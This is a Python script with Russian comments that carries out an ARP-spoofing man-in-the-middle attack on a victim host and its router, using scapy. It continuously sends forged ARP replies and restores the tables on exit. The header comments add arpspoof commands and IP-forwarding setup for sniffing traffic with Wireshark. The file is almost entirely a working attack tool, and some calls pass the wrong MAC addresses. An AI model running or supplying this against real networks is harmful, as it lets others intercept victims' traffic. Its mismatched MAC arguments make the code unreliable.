#!/usr/bin/python3.10
#Митм атака между роутером и жертвой (отправка 2 арп ответов для роутера и жертвы для обновления арп таблицы)
# митм атака > arpspoof -i wlan0 -t 198.18.42.14 198.18.42.1 and > arpspoof -i wlan0 -t 198.18.42.1 198.18.42.14 and use wireshark
# в консоли рут > echo 1 > /proc/sys/net/ipv4/ip_forward
import sys
import time
import scapy.all as scapy
import argparse

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip) # переменная, которая содердит экземпляр объекта АРП пакета для пула IP
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #отправка пакета на широковещательный адрес
    arp_request_broadcast = broadcast/arp_request #создаем новый пакет, объединяя арп и бродкаст
    answered_list = scapy.srp(arp_request_broadcast,timeout=2,verbose=False)[0] #вручную отправка пакетов, которая содержит
    # Ether и запись в переменную, которая будет содержать пару из 2 списков (отвеченные пакеры и неотвеченные)
    # timeout нужен для ограничения времени ожидания ответа (1 секунда)
    # verbose= False убирает лишнюю информацию в терминале

    return  answered_list[0][1].hwsrc # забираем из списка только MAC


def spoof(target_ip, spoof_ip, dst_mac):

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=dst_mac, psrc=spoof_ip)
    #создаем пакет с помощью scapy.ARP() - сохраняем в переменную пакет, делаем перенаправление через наш ПК.
    #op=1 арп запрос, а если поставим 2 то получим арп ответ
    #после настоящего мака жертвы указываем поддельную информацию IP атакующего

    #чтобы отправить сформированный пакет воспользуемся методом скейпи
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip, destination_mac):

    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)#создаем ответ, где в последнем поле указываем валидный мак адрес
    scapy.send(packet, count=4, verbose=False)

def get_ip():

	parser=argparse.ArgumentParser()
	parser.add_argument("-t","--target",dest="victim",help="Указание IP адреса victim")
	parser.add_argument("-s","--spoof",dest="spoof",help="Указание IP адреса gateway")
	options = parser.parse_args()

	if not options.victim:
		parser.error("[-] Выявлено отсутствие аргументов --help")

	if not options.spoof:
		parser.error("[-] Выявлено отсутствие аргументов --help")

	return options

# вариант получения от пользователя входных параметров
ip = get_ip()
target_ip = ip.victim
gateway_ip = ip.spoof

# получение мак адресов цели и роутера
dst_mac = get_mac(target_ip)
destination_mac = get_mac(gateway_ip)

sent_packet_count = 0 # счетчик для вывода

try:
    #становимся человеком по середине и шлем бесконечно пакеты роутеру и жертве
    while True:
        spoof(target_ip, gateway_ip, dst_mac)
        spoof(gateway_ip, target_ip, dst_mac)
        sent_packet_count += 2
        print("\r[+] Отправлено пакетов: " + str(sent_packet_count), end="") # \r вывод с новой строки
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Идет восстановление ARP таблиц ...")
    restore(target_ip, gateway_ip, destination_mac)
    restore(gateway_ip, target_ip, destination_mac)
    print("\n[+] ARP таблицы восстановлены")

